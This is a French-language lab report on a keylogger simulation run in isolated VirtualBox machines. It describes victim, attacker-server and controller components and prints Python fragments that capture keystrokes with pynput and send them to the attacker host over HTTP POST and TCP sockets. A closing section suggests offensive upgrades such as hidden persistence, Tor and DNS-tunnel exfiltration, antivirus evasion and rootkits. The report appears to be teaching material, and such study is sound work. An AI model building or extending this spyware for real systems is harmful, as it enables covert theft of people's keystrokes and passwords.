# Rapport Technique - Simulation Keylogger Avancée

## 1. Introduction

Ce projet implémente une simulation complète de keylogger avancé dans un environnement VirtualBox isolé. Le système est composé de trois composants principaux : une machine victime, une machine attaquante et un contrôleur, communiquant via un réseau interne VirtualBox.

## 2. Architecture Globale

### 2.1 Schéma d'Architecture

```
┌─────────────────┐         ┌─────────────────┐         ┌─────────────────┐
│   VM Victime    │────────▶│  VM Attaquant   │◀────────│   Contrôleur    │
│                 │         │                 │         │                 │
│  - Keylogger    │  HTTP/  │  - Serveur HTTP │         │  - Interface    │
│  - Capture      │  TCP    │  - Stockage     │         │  - Commandes    │
│  - Exfiltration │         │  - Analyse      │         │  - Monitoring   │
└─────────────────┘         └─────────────────┘         └─────────────────┘
```

### 2.2 Composants

#### 2.2.1 VM Victime (keylogger.py)
- **Rôle** : Capture les frappes clavier en temps réel
- **Technologies** : Python, pynput, requests, socket
- **Fonctionnalités** :
  - Capture des frappes via pynput
  - Normalisation des touches spéciales
  - Génération d'UUID unique par instance
  - Encodage JSON des logs
  - Exfiltration HTTP POST ou TCP Socket
  - Mécanisme de retry (3 tentatives)
  - Buffer local en cas d'échec réseau

#### 2.2.2 VM Attaquant (server.py + storage.py)
- **Rôle** : Réception, stockage et organisation des logs
- **Technologies** : Python, Flask, threading
- **Fonctionnalités** :
  - Serveur HTTP (port 8080) pour réception POST
  - Serveur TCP (port 9999) pour réception socket
  - Stockage organisé par victime/date
  - API REST pour consultation
  - Analyse basique des logs (mots-clés, séquences)

#### 2.2.3 Contrôleur (controller.py)
- **Rôle** : Interface de gestion et monitoring
- **Technologies** : Python, requests, colorama
- **Fonctionnalités** :
  - Interface CLI interactive
  - Liste des victimes actives
  - Affichage des logs en temps réel
  - Analyse des logs
  - Structure pour commandes distantes

## 3. Implémentation Technique

### 3.1 Capture des Frappes

Le keylogger utilise la bibliothèque `pynput` pour intercepter les événements clavier :

```python
def on_press(self, key):
    normalized_key = self.normalize_key(key)
    log_entry = {
        "victim_id": self.victim_id,
        "timestamp": datetime.now().isoformat(),
        "key": normalized_key,
        "raw_key": str(key)
    }
    self.log_queue.put(log_entry)
```

**Normalisation** : Les touches spéciales sont converties en chaînes lisibles :
- `Key.space` → `' '`
- `Key.enter` → `'\n'`
- `Key.backspace` → `'[BACKSPACE]'`

### 3.2 Exfiltration

Deux modes d'exfiltration sont implémentés :

#### Mode HTTP
```python
def send_via_http(self, logs):
    payload = {
        "victim_id": self.victim_id,
        "logs": logs,
        "timestamp": datetime.now().isoformat()
    }
    response = requests.post(config.HTTP_ENDPOINT, json=payload)
```

#### Mode TCP
```python
def send_via_tcp(self, logs):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((config.TCP_HOST, config.TCP_PORT))
    data = self.encode_logs(payload)
    sock.sendall(data.encode('utf-8'))
```

### 3.3 Résilience

**Mécanisme de retry** :
- 3 tentatives avec délai de 5 secondes
- Buffer local si toutes les tentatives échouent
- Sauvegarde dans `keylog_buffer.json`

**Thread d'envoi asynchrone** :
- Envoi périodique toutes les 2 secondes
- Non-bloquant pour la capture

### 3.4 Stockage

Structure hiérarchique :
```
logs/
├── <victim_id>/
│   ├── 2024-01-15/
│   │   ├── log_14-30-25.json
│   │   └── log_14-31-10.json
│   └── 2024-01-16/
│       └── log_09-15-30.json
```

**Avantages** :
- Organisation par victime et date
- Facilite la consultation et l'analyse
- Évite les fichiers trop volumineux

### 3.5 API REST

Endpoints implémentés :

| Méthode | Endpoint | Description |
|---------|----------|-------------|
| GET | `/victims` | Liste toutes les victimes |
| POST | `/logs` | Reçoit les logs d'une victime |
| GET | `/victims/<id>/logs` | Récupère les logs d'une victime |
| GET | `/victims/<id>/analyze` | Analyse les logs d'une victime |

## 4. Configuration Réseau

### 4.1 VirtualBox - Réseau Interne

**Configuration** :
- Mode : Réseau Interne
- Nom : `lab-network`
- IP Attaquant : 192.168.56.101 (exemple)
- IP Victime : 192.168.56.102 (exemple)

**Isolation** : Les VMs ne peuvent communiquer qu'entre elles, pas avec l'hôte ou Internet.

### 4.2 Ports Utilisés

- **8080** : Serveur HTTP Flask
- **9999** : Serveur TCP Socket

## 5. Utilisation

### 5.1 Démarrage

1. **VM Attaquant** :
   ```bash
   cd attaquant
   pip3 install -r requirements.txt
   python3 server.py
   ```

2. **VM Victime** :
   ```bash
   cd victime
   # Modifier config.py avec l'IP de l'attaquant
   pip3 install -r requirements.txt
   python3 keylogger.py
   ```

3. **Contrôleur** :
   ```bash
   cd controleur
   # Modifier config.py avec l'IP de l'attaquant
   pip3 install -r requirements.txt
   python3 controller.py
   ```

### 5.2 Commandes du Contrôleur

- `list` : Liste les victimes actives
- `logs <victim_id>` : Affiche les logs
- `analyze <victim_id>` : Analyse les logs
- `command <victim_id> <cmd>` : Envoie une commande
- `exit` : Quitte

## 6. Résultats et Tests

### 6.1 Tests Effectués

1. **Test de capture** : ✅ Les frappes sont correctement capturées
2. **Test d'exfiltration HTTP** : ✅ Les logs arrivent sur le serveur
3. **Test d'exfiltration TCP** : ✅ Les logs arrivent via socket
4. **Test de résilience** : ✅ Retry fonctionne en cas d'échec
5. **Test de stockage** : ✅ Organisation correcte par victime/date
6. **Test du contrôleur** : ✅ Affichage et analyse fonctionnels

### 6.2 Exemple de Sortie

**Keylogger** :
```
[+] Keylogger initialisé
[+] ID Victime: 550e8400-e29b-41d4-a716-446655440000
[+] Mode d'exfiltration: http
[+] Serveur cible: 192.168.56.101:8080
[+] Capture démarrée
[+] 5 logs envoyés avec succès
```

**Serveur Attaquant** :
```
[+] 5 logs reçus de 550e8400-e29b-41d4-a716-446655440000
[+] 3 logs reçus de 550e8400-e29b-41d4-a716-446655440000
```

**Contrôleur** :
```
controleur> list
Victimes actives:
------------------------------------------------------------
1. ID: 550e8400-e29b-41d4-a716-446655440000
   Statut: ACTIVE
   Dernière activité: 2024-01-15T14:30:25

controleur> logs 550e8400-e29b-41d4-a716-446655440000
Hello World
This is a test
```

## 7. Limites Observées

### 7.1 Limitations Techniques

1. **Pas de chiffrement** : Les logs sont envoyés en clair
2. **Pas d'authentification** : N'importe qui peut envoyer des logs
3. **Pas de persistance** : Le keylogger s'arrête si fermé
4. **Commandes distantes** : Structure prête mais non implémentée côté victime
5. **Analyse basique** : L'analyse des logs est limitée
6. **Performance** : Sur Linux, nécessite parfois sudo pour la capture

### 7.2 Limitations de Sécurité

1. **Isolation** : Dépend de la configuration VirtualBox
2. **Détection** : Le processus est visible dans le gestionnaire de tâches
3. **Réseau** : Communication non chiffrée
4. **Logs** : Stockage en clair sur le disque

## 8. Propositions d'Amélioration

### 8.1 Améliorations Techniques

1. **Chiffrement** :
   - Utiliser TLS/SSL pour les communications
   - Chiffrer les logs avant envoi (AES-256)
   - Chiffrer les fichiers stockés

2. **Authentification** :
   - Tokens d'authentification
   - Clés partagées
   - Certificats SSL

3. **Persistance** :
   - Service système (systemd, Windows Service)
   - Démarrage automatique
   - Masquage du processus

4. **Commandes distantes** :
   - Implémenter l'écoute de commandes côté victime
   - WebSocket pour communication bidirectionnelle
   - Commandes : start/stop, switch_mode, flush_logs

5. **Analyse avancée** :
   - Détection de mots de passe
   - Détection d'URLs
   - Analyse comportementale
   - Machine learning pour détecter patterns

6. **Interface** :
   - Interface web (Flask/Django)
   - Dashboard en temps réel
   - Graphiques et statistiques

### 8.2 Améliorations de Sécurité

1. **Steganographie** : Cacher les logs dans des images
2. **Tor** : Utiliser le réseau Tor pour l'exfiltration
3. **DNS Tunneling** : Exfiltrer via requêtes DNS
4. **Anti-détection** : Techniques d'évasion antivirus
5. **Rootkit** : Masquage au niveau du noyau

### 8.3 Améliorations d'Architecture

1. **Base de données** : Utiliser SQLite/PostgreSQL au lieu de fichiers JSON
2. **Queue système** : Utiliser Redis/RabbitMQ pour la gestion des logs
3. **Microservices** : Séparer les composants en services indépendants
4. **Docker** : Conteneuriser les composants
5. **Monitoring** : Ajouter des métriques et alertes

## 9. Conclusion

Ce projet a permis de développer une simulation complète de keylogger avancé avec :
- ✅ Capture en temps réel
- ✅ Exfiltration HTTP/TCP
- ✅ Résilience et retry
- ✅ Stockage organisé
- ✅ Interface de contrôle
- ✅ Analyse basique

Le système fonctionne correctement dans un environnement VirtualBox isolé et respecte les exigences du laboratoire. Les améliorations proposées permettraient de rendre le système plus robuste, sécurisé et fonctionnel pour des scénarios plus avancés.

## 10. Références

- Documentation VirtualBox : https://www.virtualbox.org/manual/
- Documentation pynput : https://pynput.readthedocs.io/
- Documentation Flask : https://flask.palletsprojects.com/
- Documentation Python : https://docs.python.org/3/

---

**Note** : Ce projet est strictement à des fins pédagogiques et doit être utilisé uniquement dans des environnements isolés et autorisés.

